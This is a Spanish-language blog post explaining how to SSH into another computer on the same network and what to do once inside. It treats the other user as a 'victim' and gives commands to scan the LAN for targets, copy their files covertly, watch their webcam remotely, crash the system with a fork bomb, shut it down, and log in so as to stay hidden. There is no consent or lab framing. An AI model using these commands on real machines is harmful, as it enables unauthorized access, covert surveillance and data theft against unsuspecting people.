<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="es" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Conectarse a otro pc por tunelación SSH - shakar      Blog de ciberseguridad      </title>
<meta name="description" content="En este post te explico brevemente como conectarte a otra maquina dentro de tu red vía túnel SSH y algunas cosas que puedes hacer en el ordenador objetivo">



<meta property="og:type" content="article">
<meta property="og:locale" content="es_ES">
<meta property="og:site_name" content="shakar | Blog de ciberseguridad">
<meta property="og:title" content="Conectarse a otro pc por tunelación SSH">
<meta property="og:url" content="http://localhost:4000/tunel-ssh/">


  <meta property="og:description" content="En este post te explico brevemente como conectarte a otra maquina dentro de tu red vía túnel SSH y algunas cosas que puedes hacer en el ordenador objetivo">



  <meta property="og:image" content="http://localhost:4000/assets/images/tunel-ssh/ssh-tunneling.png">





  <meta property="article:published_time" content="2021-05-25T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/tunel-ssh/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "shakarr",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="shakar | Blog de ciberseguridad Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Conectarse a otro pc por tunelación SSH</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/profilepic.jpg" alt="shakarr" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">shakarr</h3>
    
    
      <p class="author__bio" itemprop="description">
        Apasionado de la informática / Programador / Aspirante a experto en ciberseguridad
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://instagram.com/ridel_shakar" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram
          </a>
        </li>
      

      

      

      
        <li>
          <a href="https://github.com/shakarr" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Conectarse a otro pc por tunelación SSH">
    <meta itemprop="description" content="En este post te explico brevemente como conectarte a otra maquina dentro de tu red vía túnel SSH y algunas cosas que puedes hacer en el ordenador objetivo">
    <meta itemprop="datePublished" content="May 25, 2021">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Conectarse a otro pc por tunelación SSH
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-05-25T00:00:00+02:00">May 25, 2021 </time>&emsp;
          
          
        </p>
        <p align="center">
<img src="/assets/images/tunel-ssh/ssh-banner.jpeg" width="50%" />
</p>

<p>Porque voy a querer conectarme por tunelación ssh a otro PC? Pues bien quedate y verás el porque, pero antes como siempre un poco de teoría para entender el concepto.</p>

<p>SH o Secure Shell es un protocolo el cual facilita las comunicaciones “seguras” entre dos sistemas usando una arquitectura del tipo cliente/servidor y que permite a sus usuarios conectarse a un host de manera remota. Si comparamos SSH con otros protocolos de comunicación remota tales como FTP o Telnet, SSH encripta la sesión de conexión a diferencia de estos ultimos, haciendo imposible que alguien pueda obtener contraseña encriptadas(aunque ya sabemos que nada es imposible)</p>

<h1 id="como-conectarme-remotamente-a-otro-ordenador">¿Como conectarme remotamente a otro ordenador?</h1>

<p>Pues bien esto es bien sencillo. Entre conexiones entre terminales linux por ejemplo, lo único que necesitamos es que el ordenador al que nos queremos conectar tenga instalado el SSH, en caso de no ser así, haremos uso del siguiente comando:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-get install ssh
</code></pre></div></div>

<blockquote>
  <p><strong>NOTA:</strong> 
También tendras que tenerlo instalado en tu maquina, ya que mediante la instalación se nos habilita el puerto 22, el cual se encarga de realizar operaciones como SSH, SCP, SFTP</p>
</blockquote>

<h2 id="opción-1">Opción 1</h2>

<p>Si estamos conectados en la msima red, y hay pocos usuarios en la misma, lo único que te va a interesar saber es el nombre de usuario del sistema objetivo, sin ser necesario que conozcas su IP privada, por que te estarás preguntando, pues bien es bastante sencillo, desde la terminal podemos hacer un <code class="language-plaintext highlighter-rouge">nmap -SP 192.168.1.1-254</code>, de esta manera obtendremos todas las IP privadas que el protocolo DHCP a asigando a cada uno de los usuarios de la red.</p>

<p>Hay que tener en cuanta que la sintaxis para realizar la conexión es la siguiente <code class="language-plaintext highlighter-rouge">ssh USUARIO@IPPRIVADA</code>, por tanto sabiendo ya las IP con nmap, tan solo con tener el nombre de usuario podríamos ir probando con cada una de ellas. Como es evidente una vez se realice la conexión con éxito, el sistemas nos preguntará por la contraseña del equipo objetivo. Por la red encontrarás muchas maneras de como obtener contraseñas de usuarios, no obstante pronto subiré un articulo realizando esta práctica.</p>

<p>Si la contraseña introducida es correcta, estaremos dentro del sistema y podremos ir visualizando las directorios y demás, si la contraseña es incorrecta no aparecerán notificaciones ni nada por el estilo que advierta al usuario de que alguien está intentando acceder a su equipo.</p>

<blockquote>
  <p><strong>NOTA:</strong></p>
</blockquote>

<p>El usuario es capaz de saber si hay alguien coenctado a su sistema. Esto lo puede hacer haciendo uso del comandos como <code class="language-plaintext highlighter-rouge">who -q</code>, que muestra el número de usuarios actuales conectados, <code class="language-plaintext highlighter-rouge">ps -aux grep sshd</code>, esto basicamente lo que hace es listar los procesos del sistemas y hace una busqueda por el proceso SSHD que se encarga de realizar conexiones remotas, y muchos otros métodos más.</p>

<h2 id="opción-2">Opción 2</h2>

<p>Estando conectados a la misma red(otra vez), en caso de que querais hacer una prueba por vuestra propia cuenta, podemos usar el comando <code class="language-plaintext highlighter-rouge">hostname -I</code> se nos mostrará la IP privada.</p>

<h1 id="que-puedo-hacer-una-vez-conectado-al-ordenador-objetivo">¿Que puedo hacer una vez conectado al ordenador objetivo?</h1>

<p>Esta es la pregunta más interesante que vuestro lado pícaro os habrá formulado y creo que ya sabeis la respuesta, efectivamente la respuesta es <strong>TODO</strong>, podemos ver sus directorios, sus ficheros, fotos, videos, proyectos y demás. Veamos algunas cositas interantes.</p>

<p>Supongamos que la víctima tiene una carpeta de fotos y nosotros queremos “tomarlas prestadas”, pues bien esto se hace mediante <code class="language-plaintext highlighter-rouge">scp</code>.</p>

<p>Suponemos la siguiente foto <code class="language-plaintext highlighter-rouge">foto.png</code>, estamos ya dentro de su ordenador, queremos pasar esta foto a nuestro PC, más concretamente a nuestro escritorio, pues bien lo único que necesitamos saber es <strong>nuestra IP privada</strong>, una ves la sepamos podemos ahcer lo siguiente: <code class="language-plaintext highlighter-rouge">scp foto.png USUARIO@NUESTRAIPPRIVADA:/home/usuario/escritorio</code>, siendo <strong>USUARIO</strong> tu nombre de usuario, y siendo <strong>NUESTRAIPPRIVADA</strong> tu IP privada, te pedirá después la pass de tu ordenador y acto seguido se procederá a la transferencia del archivo, se despierta tu curiosidad cierto, claro si eres capaz de “tomar prestado” una foto eres capaz de obtener cualquier archivo, y lo mejor es que la víctima no tendrá constancia de esto.</p>

<p>Otra de las cosas que se pueden hacer es <strong>ver su cámara</strong>, desactivar la luz que tiene la camara es bien sencillo, os lo dejo que lo investigueis por vuestra cuenta. Bien ponemos el supuesto de que estamos en su terminal con la conexión ya realizada, por lo que cualquier comando que escribamos afectará a su sistema. Si hacemos un <code class="language-plaintext highlighter-rouge">sudo halt</code> por ejemplo se le apagará el PC si confirmación ni nada por el estilo, y claro si podemos hacer esto ¿porque no podríamos instalarle algo sin que se diera cuenta?, bien vamos a instalarle el siguiente programa <code class="language-plaintext highlighter-rouge">sudo apt-get install mplayer</code> y una vez que esté instalado usa el siguiente comando: <code class="language-plaintext highlighter-rouge">mplayer -fps 20 -cache 50 -tv driver=vl42:width=64:height=48:device=/dev/video0 tv://</code>, esto te va a permitir ver su camara remotamente(obviamente se le encenderá la luz si no la habeis quitado).</p>

<p>También podemos colapsarle el sistema haciendo uso de una llamada recursiva, para ello hacemos lo siguiente: <code class="language-plaintext highlighter-rouge">colapso(){ colapso | colapso &amp; }; colapso</code>, si sabeís de llamadas recursivas sabreis que se está haciendo aqui si no os lo dejo para que lo investigueis.</p>

<p>Podemos también abrir cualquier programa y ejecutar cualquier aplicación, para ello haremos antes que nada export <code class="language-plaintext highlighter-rouge">display=:0.0</code>, y ya luego podemos escribir por ejemplo firefox para que se habra el navegador.</p>

<p>También podemos mandarle mensajes por pantalla usando el siguiente comando: <code class="language-plaintext highlighter-rouge">zenity --info --text="Estoy en tu sistema" --display=:0</code></p>

<h1 id="puedo-entrar-de-manera-invisible">¿Puedo entrar de manera invisible?</h1>

<p>Claro que sí, así a la hora de realizar un escaneo no se detectará que hay alguien más en sus sistema. Esto lo podemos hacer de la siguiente manera: <code class="language-plaintext highlighter-rouge">ssh -t USER@HOST /bin/bash -I</code></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#ssh" class="page__taxonomy-item" rel="tag">SSH</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#tutoriales" class="page__taxonomy-item" rel="tag">Tutoriales</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#t%C3%BAneles" class="page__taxonomy-item" rel="tag">Túneles</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#explicaciones" class="page__taxonomy-item" rel="tag">Explicaciones</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-05-25T00:00:00+02:00">May 25, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/explicando-el-modelo-osi/" class="pagination--pager" title="Explicando el modelo OSI y TCP/IP
">Previous</a>
    
    
      <a href="/creando-1000-hostpost/" class="pagination--pager" title="Creando 1000+ hostposts
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2021 shakarr</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
